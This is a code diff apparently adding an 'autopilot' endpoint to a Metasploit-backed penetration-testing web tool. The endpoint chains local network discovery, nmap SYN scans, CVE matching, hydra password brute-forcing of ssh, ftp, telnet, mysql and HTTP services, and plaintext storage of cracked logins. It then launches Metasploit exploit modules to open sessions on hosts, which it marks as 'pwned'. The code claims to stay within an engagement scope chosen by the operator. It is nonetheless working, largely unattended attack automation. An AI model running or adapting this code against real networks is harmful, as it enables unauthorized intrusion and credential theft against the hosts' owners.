@@ -2672,3 +2672,438 @@ def _service_for_tool(tool: str) -> str:
         "dnsrecon": "dns",
     }
     return map_.get(tool, "")
+
+
+# ---- autopilot: the whole flow, one button ---------------------------------
+# One explicit page that walks the local network end to end: discovery ->
+# fingerprint -> CVE correlation -> password attacks -> exploit attempts.
+# It is the MOST aggressive surface in the tool: running it requires an active
+# engagement scope (403 otherwise), it only touches hosts inside that scope,
+# and every target it plans to brute-force or exploit is named in the live log
+# so the operator can watch exactly what is being done to which host.
+
+_AUTOPILOT_STATE: dict[str, Any] = {"job": None}
+
+
+def _autopilot_job() -> dict[str, Any] | None:
+    return _AUTOPILOT_STATE["job"]
+
+
+@router.post("/autopilot/start")
+def autopilot_start() -> dict[str, Any]:
+    """OPT-IN hard: full recon + credential + exploit walk of the local network.
+
+    Requires an active engagement scope. Only one run at a time.
+    """
+    eng_id, store = _active_scope()
+    if eng_id is None or store is None:
+        raise HTTPException(
+            status_code=403,
+            detail="autopilot requires an active engagement scope (choose one in the header)",
+        )
+    running = _autopilot_job()
+    if running and running.get("status") == "running":
+        raise HTTPException(
+            status_code=409, detail="an autopilot run is already active"
+        )
+    msf = _get_msf()
+    if msf is None:
+        raise HTTPException(status_code=503, detail="msf unavailable")
+
+    scope_cidrs = store.scope_of(eng_id)
+    job: dict[str, Any] = {
+        "id": uuid.uuid4().hex[:12],
+        "status": "running",
+        "stage": "discovery",
+        "progress": 0.0,
+        "message": f"autopilot engaging (scope: {', '.join(scope_cidrs)})",
+        "hosts": {},
+        "log": [],
+        "aborted": False,
+        "created": datetime.now(UTC).isoformat(),
+    }
+    _AUTOPILOT_STATE["job"] = job
+    import threading
+
+    t = threading.Thread(
+        target=_run_autopilot, args=(job, msf, scope_cidrs), daemon=True
+    )
+    t.start()
+    return {"job_id": job["id"], "status": "running"}
+
+
+@router.get("/autopilot/status")
+def autopilot_status() -> dict[str, Any]:
+    job = _autopilot_job()
+    if not job:
+        return {"status": "idle", "hosts": {}, "log": []}
+    return job
+
+
+@router.post("/autopilot/stop")
+def autopilot_stop() -> dict[str, Any]:
+    job = _autopilot_job()
+    if not job:
+        raise HTTPException(status_code=404, detail="no autopilot run")
+    job["aborted"] = True
+    _ap_log(job, "[!] stop requested — closing stages after this point")
+    return {"status": "abort_requested"}
+
+
+def _ap_log(job: dict[str, Any], msg: str) -> None:
+    job["log"].append(msg)
+    job["log"] = job["log"][-400:]
+
+
+def _ap_note_host(job: dict[str, Any], ip: str, **fields: Any) -> None:
+    hosts: dict[str, Any] = job.setdefault("hosts", {})
+    entry = hosts.setdefault(ip, {"stage": "queued"})
+    entry.update(fields)
+
+
+def _run_autopilot(job: dict[str, Any], msf: MsfClient, scope_cidrs: list[str]) -> None:
+    from services.toolkit import ToolkitRunner
+
+    def _stopped() -> bool:
+        return bool(job.get("aborted"))
+
+    def _pct(stage_num: int, frac: float = 0.0) -> float:
+        # 6 stages: discovery 0-10, fingerprint 10-40, vulns 40-55,
+        # passwords 55-80, exploits 80-95, wrap 95-100
+        bounds = [0, 10, 40, 55, 80, 95, 100]
+        base = bounds[stage_num] if stage_num <= 5 else 95
+        top = bounds[stage_num + 1] if stage_num <= 5 else 100
+        return round(min(base + max(0.0, min(1.0, frac)) * (top - base), 100), 1)
+
+    _update(job, progress=_pct(0, 0.2))
+    _ap_log(job, f"[*] autopilot start — scope {', '.join(scope_cidrs)}")
+
+    # ---- stage 1: discovery ------------------------------------------------
+    _update(job, stage="discovery", message="discovering neighbors...")
+    from services.discovery import NeighborFinder
+
+    finder = NeighborFinder(msf)
+    default_cidr = "192.168.1.0/24"
+    found_ips: list[str] = []
+    try:
+        found = finder.discover(default_cidr)
+    except Exception as exc:
+        _ap_log(job, f"[!] discovery failed: {exc}")
+        found = []
+    seen_set: set[str] = set()
+    for h in found:
+        ip = h.ip
+        if not ip or ":" in ip or len(ip.split(".")) != 4:
+            continue
+        if ip in seen_set:
+            continue
+        seen_set.add(ip)
+        ok, _reason = _host_in_scope(ip)
+        if not ok:
+            _ap_log(job, f"[-] {ip}: skipped (outside scope)")
+            continue
+        _save_neighbor_host(ip, h.mac, h.vendor, h.hostname)
+        _ap_note_host(job, ip, stage="discovered")
+        _ap_log(
+            job,
+            f"[+] {ip} {'(' + h.hostname + ') ' if h.hostname else ''}{h.mac or ''}",
+        )
+        found_ips.append(ip)
+    _update(job, progress=_pct(0, 1.0))
+    if _stopped():
+        _ap_log(job, "[!] aborted after discovery")
+        _update(job, status="aborted", message="stopped by operator")
+        return
+
+    # ---- stage 2: fingerprint ---------------------------------------------
+    _update(
+        job, stage="fingerprint", message=f"fingerprinting {len(found_ips)} host(s)..."
+    )
+    runner = ToolkitRunner(progress=lambda m, p: _update(job, message=m))
+    for idx, ip in enumerate(found_ips):
+        if _stopped():
+            break
+        _ap_note_host(job, ip, stage="fingerprinting")
+        argv = [
+            "nmap",
+            "-sS",
+            "-T4",
+            "-Pn",
+            "-p",
+            "22,80,443,445,3389,8080,8443,21,23,25,53,110,143,3306,5432,5900,6379,9200",
+            "--max-retries",
+            "1",
+            "--host-timeout",
+            "8s",
+            "-oX",
+            "-",
+            ip,
+        ]
+        result = runner.run_tool("nmap", argv, timeout=15)
+        parsed = _parse_nmap_xml(result["stdout"]) if result["status"] == "ok" else []
+        for entry in parsed:
+            open_svcs = [
+                s for s in entry.get("services", []) if s.get("state") == "open"
+            ]
+            if entry.get("ip") and entry["ip"] != ip:
+                continue
+            _save_neighbor_services(ip, entry.get("services", []))
+            _save_neighbor_host(
+                ip, entry.get("mac"), entry.get("vendor"), entry.get("hostname")
+            )
+            _ap_log(
+                job,
+                f"[+] {ip}: {', '.join(str(s['port']) + ' ' + (s.get('service') or '?') for s in open_svcs) or 'no open ports'}",
+            )
+            _ap_note_host(
+                job,
+                ip,
+                stage="fingerprinted",
+                services=[
+                    {"port": s["port"], "service": s.get("service")} for s in open_svcs
+                ],
+            )
+        if not parsed:
+            _ap_note_host(job, ip, stage="unreachable")
+            _ap_log(job, f"[-] {ip}: no response")
+        _update(job, progress=_pct(1, (idx + 1) / max(1, len(found_ips))))
+    if _stopped():
+        _ap_log(job, "[!] aborted during fingerprint")
+        _update(job, status="aborted", message="stopped by operator")
+        return
+
+    # ---- stage 3: vuln correlation ----------------------------------------
+    _update(job, stage="vulns", message="correlating known vulnerabilities...")
+    vulns_by_host: dict[str, list[dict[str, Any]]] = {}
+    for ip in found_ips:
+        svcs = _load_neighbor_services().get(ip, [])
+        hits: list[dict[str, Any]] = []
+        for svc in svcs:
+            if svc.get("state") != "open":
+                continue
+            matched = _match_service_vulns(ip, svc)
+            for v in matched:
+                _save_service_vulns(ip, svc["port"], svc.get("proto", "tcp"), [v])
+            if matched:
+                hits.extend(matched)
+        if hits:
+            vulns_by_host[ip] = hits
+            _ap_note_host(job, ip, vulns=[v.get("vid") for v in hits])
+            _ap_log(job, f"[!] {ip}: {', '.join(str(v['vid']) for v in hits)}")
+        _update(
+            job, progress=_pct(2, (found_ips.index(ip) + 1) / max(1, len(found_ips)))
+        )
+    if _stopped():
+        _update(job, status="aborted", message="stopped by operator")
+        return
+
+    # ---- stage 4: password attacks ----------------------------------------
+    _update(job, stage="passwords", message="default-password attacks...")
+    import re as _re
+
+    eligible: list[tuple[str, int, str]] = []
+    svcs_now = _load_neighbor_services()
+    for ip in found_ips:
+        for svc in svcs_now.get(ip, []):
+            if svc.get("state") != "open":
+                continue
+            name = (svc.get("service") or "").lower()
+            family = next(
+                (k for k in ("ssh", "ftp", "telnet", "mysql", "http") if k in name),
+                None,
+            )
+            if not family:
+                continue
+            if family == "http" and int(svc.get("port") or 0) in (443, 8443):
+                continue  # https needs https hydra syntax; out of auto scope
+            if family == "http":
+                family = "http-basic"
+            eligible.append((ip, int(svc.get("port") or 0), family))
+    # prioritize ssh/ftp/telnet/mysql over http (http forms are noisy)
+    eligible.sort(key=lambda t: 0 if t[2] != "http-basic" else 1)
+    eligible = eligible[:8]
+    creds_by_host: dict[str, list[dict[str, Any]]] = {}
+    for idx, (ip, port, family) in enumerate(eligible):
+        if _stopped():
+            break
+        _ap_log(job, f"[passwords] {ip}:{port} ({family}) — running hydra...")
+        _ap_note_host(job, ip, stage="passwords")
+        userlist = str(_RUNTIME_DATA / "users.txt")
+        passlist = str(_RUNTIME_DATA / "passwords.txt")
+        argv = ["hydra", "-L", userlist, "-P", passlist, "-t", "6", "-f", "-o", "-"]
+        if family == "http-basic":
+            argv.append(f"http-get://{ip}:{port}/")
+        else:
+            argv += [ip, PASSATTACK_SERVICES[family]["hydra"]]
+        res = runner.run_tool("hydra", argv, timeout=120)
+        out = (res["stdout"] or "") + "\n" + (res["stderr"] or "")
+        hydra_hits = _re.findall(
+            r"\[\d+\]\[[^\]]+\]\s*host:\s*([\d.]+)\s+login:\s*([^\s]+)\s+password:\s*([^\s]+)",
+            out,
+        )
+        for m in hydra_hits:
+            host_ip, user, password = m[0], m[1], m[2]
+            cred = {
+                "host": host_ip,
+                "port": port,
+                "service": family,
+                "user": user,
+                "password": password,
+            }
+            creds_by_host.setdefault(ip, []).append(cred)
+            conn = _neighbor_db()
+            conn.execute(
+                "INSERT OR REPLACE INTO found_creds (host, port, service, user, password, found_at) "
+                "VALUES (?, ?, ?, ?, ?, ?)",
+                (
+                    cred["host"],
+                    cred["port"],
+                    cred["service"],
+                    cred["user"],
+                    cred["password"],
+                    datetime.now(UTC).isoformat(),
+                ),
+            )
+            conn.commit()
+            conn.close()
+            _ap_log(job, f"[!!!] {ip}:{port} login {cred['user']}:{cred['password']}")
+        _update(job, progress=_pct(3, (idx + 1) / max(1, len(eligible))))
+    _update(
+        job,
+        message=f"password stage complete ({sum(len(c) for c in creds_by_host.values())} cred(s))",
+    )
+    if _stopped():
+        _update(job, status="aborted", message="stopped by operator")
+        return
+
+    # ---- stage 5: exploit attempts ----------------------------------------
+    _update(
+        job, stage="exploits", message="attempting exploits (CVE module hints first)..."
+    )
+    from schemas import AttackRequest, ScanMode
+    from services.attack import STATIC_SERVICE_MODULES, AttackService
+
+    attack_svc = AttackService(msf, progress=lambda m, p: None)
+    attempts_planned: list[tuple[str, str, int | None]] = []
+
+    def _port_for_module(ip: str, mod: str) -> int | None:
+        """Pick the open service port whose family the module path matches."""
+        for svc in svcs_now.get(ip, []):
+            if svc.get("state") != "open":
+                continue
+            name = (svc.get("service") or "").lower()
+            fam = (
+                "ssh"
+                if "ssh" in mod
+                else (
+                    "smb"
+                    if ("smb" in mod or "eternalblue" in mod)
+                    else (
+                        "http"
+                        if "http" in mod or "tomcat" in mod
+                        else (
+                            "ftp"
+                            if "ftp" in mod
+                            else (
+                                "rdp"
+                                if "rdp" in mod or "0708" in mod
+                                else (
+                                    "telnet"
+                                    if "telnet" in mod
+                                    else (
+                                        "mysql"
+                                        if "mysql" in mod
+                                        else "postgres" if "postgres" in mod else None
+                                    )
+                                )
+                            )
+                        )
+                    )
+                )
+            )
+            if fam and fam in name:
+                return int(svc.get("port") or 0) or None
+        return None
+
+    for ip, hits in vulns_by_host.items():
+        if _stopped():
+            break
+        for v in hits:
+            detail = str(v.get("detail") or "")
+            if "msf: " not in detail:
+                continue
+            mod = detail.split("msf: ")[1].split()[0]
+            if not mod.startswith("exploit/"):
+                continue
+            attempts_planned.append((ip, mod, _port_for_module(ip, mod)))
+    # fallback: static map for services with no CVE module hint
+    for ip in found_ips:
+        if _stopped():
+            break
+        if any(a[0] == ip for a in attempts_planned):
+            continue
+        if ip in creds_by_host:
+            for cred in creds_by_host[ip]:
+                mod = STATIC_SERVICE_MODULES.get(cred["service"])
+                if mod and mod not in [a[1] for a in attempts_planned if a[0] == ip]:
+                    attempts_planned.append((ip, mod, cred["port"]))
+    attempts_planned = attempts_planned[:10]
+    session_opens: list[dict[str, Any]] = []
+    for idx, (ip, mod, port_) in enumerate(attempts_planned):
+        if _stopped():
+            break
+        _ap_log(job, f"[exploit] {ip}:{port_ or '?'} via {mod}")
+        _ap_note_host(job, ip, stage="exploiting")
+        known = [{**c, "verified": True} for c in creds_by_host.get(ip, [])]
+
+        req = AttackRequest(
+            target=ip,
+            host=ip,
+            module=mod,
+            port=port_,
+            open_sessions=False,
+            mode=ScanMode.overt,
+        )
+        try:
+            results = attack_svc.run(req, known)
+        except Exception as exc:
+            results = [
+                {
+                    "host": ip,
+                    "module": mod,
+                    "result": "error",
+                    "detail": str(exc)[:120],
+                    "session_id": None,
+                }
+            ]
+        for a in results:
+            _ap_log(
+                job,
+                f"[{'!!!' if a['result'] == 'success' else '-'}] exploit {mod} on {ip}: {str(a.get('detail'))[:110]}"
+                + (f" — session {a['session_id']}" if a.get("session_id") else ""),
+            )
+            if a.get("session_id") and a.get("result") == "success":
+                _record_sessions([a])
+                _ap_note_host(job, ip, stage="pwned", session_id=a["session_id"])
+                session_opens.append(a)
+        _update(job, progress=_pct(4, (idx + 1) / max(1, len(attempts_planned))))
+
+    # ---- wrap ---------------------------------------------------------------
+    _update(job, stage="done", progress=100.0)
+    _ap_log(
+        job,
+        f"[*] autopilot complete: {len(found_ips)} host(s), "
+        f"{sum(1 for h in vulns_by_host)} with known vulns, "
+        f"{sum(len(c) for c in creds_by_host.values())} cred(s), "
+        f"{len(session_opens)} session(s)",
+    )
+    _update(
+        job,
+        status="done",
+        message=(
+            f"autopilot complete: {len(found_ips)} host(s), "
+            f"{sum(1 for h in vulns_by_host.values())} with vulns, "
+            f"{sum(len(c) for c in creds_by_host.values())} cred(s), "
+            f"{len(session_opens)} session(s)"
+        ),
+    )
